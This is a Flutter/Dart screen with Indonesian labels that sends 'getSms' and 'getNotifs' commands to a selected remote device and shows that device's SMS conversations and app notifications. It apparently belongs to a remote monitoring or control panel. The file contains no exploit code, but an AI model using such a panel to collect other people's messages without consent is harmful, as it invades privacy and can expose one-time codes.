import 'package:flutter/material.dart';
import 'package:provider/provider.dart';

import '../services/auth_service.dart';
import '../services/command_service.dart';
import '../services/socket_service.dart';
import '../theme/app_theme.dart';
import '../theme/app_typography.dart';
import '../utils/device_payload.dart';
import '../widgets/sync_widgets.dart';

class SmsScreen extends StatefulWidget {
  const SmsScreen({super.key});

  @override
  State<SmsScreen> createState() => _SmsScreenState();
}

class _SmsScreenState extends State<SmsScreen> with SingleTickerProviderStateMixin {
  final _cmd = CommandService();
  late final TabController _tabs;
  String? _selectedKey;

  @override
  void initState() {
    super.initState();
    _tabs = TabController(length: 2, vsync: this);
    WidgetsBinding.instance.addPostFrameCallback((_) {
      _loadSms();
      _loadNotifs();
    });
  }

  @override
  void dispose() {
    _tabs.dispose();
    super.dispose();
  }

  Future<void> _send(String command) async {
    final socket = context.read<SocketService>();
    final token = context.read<AuthService>().token;
    final id = socket.selectedDeviceId;
    if (id == null) return;
    if (token == null) return;
    await _cmd.send(token: token, deviceId: id, command: command, value: '');
  }

  Future<void> _loadSms() => _send('getSms');
  Future<void> _loadNotifs() => _send('getNotifs');

  @override
  Widget build(BuildContext context) {
    final socket = context.watch<SocketService>();
    final id = socket.selectedDeviceId;

    if (id == null) {
      return Center(child: Text('Pilih device dulu', style: AppTypography.menuSubtitle()));
    }

    final smsGrouped = DevicePayload.groupConversations(socket.smsByDevice[id] ?? []);
    final notifGrouped = DevicePayload.groupConversations(socket.notifsByDevice[id] ?? []);

    return Column(
      children: [
        Padding(
          padding: const EdgeInsets.fromLTRB(16, 10, 16, 0),
          child: Container(
            decoration: BoxDecoration(
              borderRadius: BorderRadius.circular(14),
              color: AppColors.dashAccent.withValues(alpha: 0.05),
              border: Border.all(color: AppColors.dashAccent.withValues(alpha: 0.12)),
            ),
            child: TabBar(
              controller: _tabs,
              onTap: (_) => setState(() => _selectedKey = null),
              indicatorSize: TabBarIndicatorSize.tab,
              dividerColor: Colors.transparent,
              indicator: BoxDecoration(
                borderRadius: BorderRadius.circular(12),
                color: AppColors.dashAccent.withValues(alpha: 0.12),
              ),
              labelColor: AppColors.dashAccent,
              unselectedLabelColor: AppColors.dashTextMuted,
              labelStyle: AppTypography.welcomeMeta().copyWith(fontWeight: FontWeight.w700, fontSize: 12),
              tabs: const [
                Tab(text: 'SMS'),
                Tab(text: 'Notifikasi'),
              ],
            ),
          ),
        ),
        Expanded(
          child: TabBarView(
            controller: _tabs,
            children: [
              _ConversationPane(
                title: 'Pesan SMS',
                emptyLabel: 'Belum ada SMS',
                grouped: smsGrouped,
                selectedKey: _selectedKey,
                onSelect: (k) => setState(() => _selectedKey = k),
                onRefresh: _loadSms,
              ),
              _ConversationPane(
                title: 'Notifikasi App',
                emptyLabel: 'Belum ada notifikasi',
                grouped: notifGrouped,
                selectedKey: _selectedKey,
                onSelect: (k) => setState(() => _selectedKey = k),
                onRefresh: _loadNotifs,
              ),
            ],
          ),
        ),
      ],
    );
  }
}

class _ConversationPane extends StatelessWidget {
  const _ConversationPane({
    required this.title,
    required this.emptyLabel,
    required this.grouped,
    required this.selectedKey,
    required this.onSelect,
    required this.onRefresh,
  });

  final String title;
  final String emptyLabel;
  final Map<String, List<Map<String, dynamic>>> grouped;
  final String? selectedKey;
  final ValueChanged<String> onSelect;
  final VoidCallback onRefresh;

  @override
  Widget build(BuildContext context) {
    return Row(
      children: [
        Expanded(
          flex: 2,
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.stretch,
            children: [
              Padding(
                padding: const EdgeInsets.fromLTRB(16, 12, 16, 8),
                child: Row(
                  children: [
                    Text(title, style: AppTypography.menuTitle()),
                    const Spacer(),
                    IconButton(
                      onPressed: onRefresh,
                      icon: Icon(Icons.refresh_rounded, color: AppColors.dashAccent.withValues(alpha: 0.8)),
                    ),
                  ],
                ),
              ),
              Expanded(
                child: grouped.isEmpty
                    ? Center(child: Text(emptyLabel, style: AppTypography.menuSubtitle()))
                    : ListView.separated(
                        padding: const EdgeInsets.symmetric(horizontal: 12),
                        itemCount: grouped.length,
                        separatorBuilder: (_, __) => const SizedBox(height: 8),
                        itemBuilder: (_, i) {
                          final e = grouped.entries.elementAt(i);
                          final selected = selectedKey == e.key;
                          final preview = e.value.isNotEmpty ? e.value.first['body']?.toString() ?? '' : '';
                          return ElegantCard(
                            onTap: () => onSelect(e.key),
                            padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 12),
                            child: Row(
                              children: [
                                Container(
                                  width: 36,
                                  height: 36,
                                  decoration: BoxDecoration(
                                    shape: BoxShape.circle,
                                    color: AppColors.dashAccent.withValues(alpha: selected ? 0.14 : 0.06),
                                  ),
                                  child: Icon(Icons.chat_bubble_outline_rounded, size: 18, color: AppColors.dashAccent.withValues(alpha: 0.8)),
                                ),
                                const SizedBox(width: 12),
                                Expanded(
                                  child: Column(
                                    crossAxisAlignment: CrossAxisAlignment.start,
                                    children: [
                                      Text(e.key, style: AppTypography.menuTitle().copyWith(fontSize: 13), maxLines: 1, overflow: TextOverflow.ellipsis),
                                      if (preview.isNotEmpty)
                                        Text(preview, style: AppTypography.welcomeMeta(), maxLines: 1, overflow: TextOverflow.ellipsis),
                                      Text('${e.value.length} pesan', style: AppTypography.welcomeMeta().copyWith(fontSize: 10)),
                                    ],
                                  ),
                                ),
                              ],
                            ),
                          );
                        },
                      ),
              ),
            ],
          ),
        ),
        Expanded(
          flex: 3,
          child: selectedKey == null || !grouped.containsKey(selectedKey)
              ? Center(child: Text('Pilih percakapan', style: AppTypography.menuSubtitle()))
              : ListView.separated(
                  padding: const EdgeInsets.all(12),
                  itemCount: grouped[selectedKey]!.length,
                  separatorBuilder: (_, __) => const SizedBox(height: 8),
                  itemBuilder: (_, i) {
                    final msg = grouped[selectedKey]![i];
                    return ElegantCard(
                      padding: const EdgeInsets.all(14),
                      child: Column(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: [
                          if ((msg['title']?.toString() ?? '').isNotEmpty)
                            Text(msg['title']!.toString(), style: AppTypography.statLabel().copyWith(fontSize: 9)),
                          const SizedBox(height: 4),
                          Text(msg['body']?.toString() ?? '-', style: AppTypography.menuSubtitle()),
                          const SizedBox(height: 6),
                          Text(msg['date']?.toString() ?? '', style: AppTypography.welcomeMeta()),
                        ],
                      ),
                    );
                  },
                ),
        ),
      ],
    );
  }
}